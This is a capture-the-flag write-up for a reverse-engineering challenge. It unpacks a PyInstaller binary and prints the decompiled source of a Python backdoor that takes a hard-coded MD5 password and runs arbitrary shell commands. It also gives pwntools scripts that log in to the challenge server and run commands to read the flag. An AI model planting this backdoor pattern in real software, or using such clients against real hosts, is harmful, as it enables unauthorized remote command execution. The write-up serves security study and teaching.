# Cyber Apocalypse 2021 Alienware Write Up

## Details:
Points: 350

Jeopardy style CTF

Category: Reverse Engineering

Comments:

```
We discovered this tool in the E.T. toolkit which they used to encrypt and exfiltrate files from infected systems. Can you help us recover the files?
This challenge will raise 43 euros for a good cause.
```


## Write up:

After extracting the .zip file we see a file named bd. Running strings on it we see some interesting stuff:

```
strings bd | grep python

b_asyncio.cpython-38-x86_64-linux-gnu.so
b_bz2.cpython-38-x86_64-linux-gnu.so
b_codecs_cn.cpython-38-x86_64-linux-gnu.so
b_codecs_hk.cpython-38-x86_64-linux-gnu.so
b_codecs_iso2022.cpython-38-x86_64-linux-gnu.so
b_codecs_jp.cpython-38-x86_64-linux-gnu.so
b_codecs_kr.cpython-38-x86_64-linux-gnu.so
b_codecs_tw.cpython-38-x86_64-linux-gnu.so
b_contextvars.cpython-38-x86_64-linux-gnu.so
b_ctypes.cpython-38-x86_64-linux-gnu.so
b_decimal.cpython-38-x86_64-linux-gnu.so
b_hashlib.cpython-38-x86_64-linux-gnu.so
b_lzma.cpython-38-x86_64-linux-gnu.so
b_multibytecodec.cpython-38-x86_64-linux-gnu.so
b_multiprocessing.cpython-38-x86_64-linux-gnu.so
b_opcode.cpython-38-x86_64-linux-gnu.so
b_posixshmem.cpython-38-x86_64-linux-gnu.so
b_queue.cpython-38-x86_64-linux-gnu.so
b_ssl.cpython-38-x86_64-linux-gnu.so
blibpython3.8.so.1.0
bmmap.cpython-38-x86_64-linux-gnu.so
breadline.cpython-38-x86_64-linux-gnu.so
bresource.cpython-38-x86_64-linux-gnu.so
btermios.cpython-38-x86_64-linux-gnu.so
xinclude/python3.8/pyconfig.h
xlib/python3.8/config-3.8-x86_64-linux-gnu/Makefile
&libpython3.8.so.1.0
```

This means that this file is a python .pyc compiled with pyinstaller. This was confirmed by running binwalk and seeing a zip archive inside containing the pyinstaller includes. Since this is a linux executable and not an exe we cannot just use the basic tools. First we need to extract the .pyc data. This is done by running:

```
objcopy --dump-section pydata=pydata.dump ./bd 
```

We can then run one of the many pyinstaller extractors, I used pyinstxtractor, https://github.com/extremecoders-re/pyinstxtractor (make sure to use the python version it was compiled with):

```
python3.8 ./pyinstxtractor/pyinstxtractor.py pydata.dump

[+] Processing pydata.dump
[+] Pyinstaller version: 2.1+
[+] Python version: 38
[+] Length of package: 6994886 bytes
[+] Found 45 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: bd.pyc
[+] Found 223 files in PYZ archive
[+] Successfully extracted pyinstaller archive: pydata.dump

You can now use a python decompiler on the pyc files within the extracted directory

```

We now see the bd.pyc file, after decompilation we get:

```python
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    client, addr = sock.accept()
    data = client.recv(32)
    if len(data) != 32:
        client.close()
    elif data.decode() != md5('s4v3_th3_w0rld').hexdigest():
        client.send('Invalid')
        client.close()
    else:
        size = client.recv(1)
        command = client.recv(int.from_bytes(size, 'little'))
        if not command.startswith('command:'):
            client.close()
        else:
            command = command.replace('command:', '')
            output = check_output(command, shell=True)
            client.send(output)
            client.close()
```

We see that we need to connect, then send the md5, then the length of whatever command, then "command:\<command to send\>".

So the first script we send ls to see what is on the system:

```python
# import pwntools
from pwn import *

# command to send
command = 'command:ls'

# connection
s = remote("138.68.179.198", 30791)

# send the md5
s.send('e2162a8692df4e158e6fd33d1467dfe0')

# send length of command
s.send(chr(len(command)))

# send command
s.send(command)

# read responses
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
```

The response from this is:

```
[+] Opening connection to 138.68.179.198 on port 30791: Done
b'bd.py\n'
b'bin\n'
b'dev\n'
b'etc\n'
b'flag.txt\n'
b'home\n'
b'lib\n'
b'media\n'
```

We then read the flag:

```python
# import pwntools
from pwn import *

# command to send
command = 'command:cat flag.txt'

# connection
s = remote("138.68.179.198", 30791)

# send the md5
s.send('e2162a8692df4e158e6fd33d1467dfe0')

# send length of command
s.send(chr(len(command)))

# send command
s.send(command)

# read responses
print(s.recvline())
```

```
[+] Opening connection to 138.68.179.198 on port 30791: Done
b'CHTB{b4ckd00r5_4r3_d4nG3r0u5}\n'
```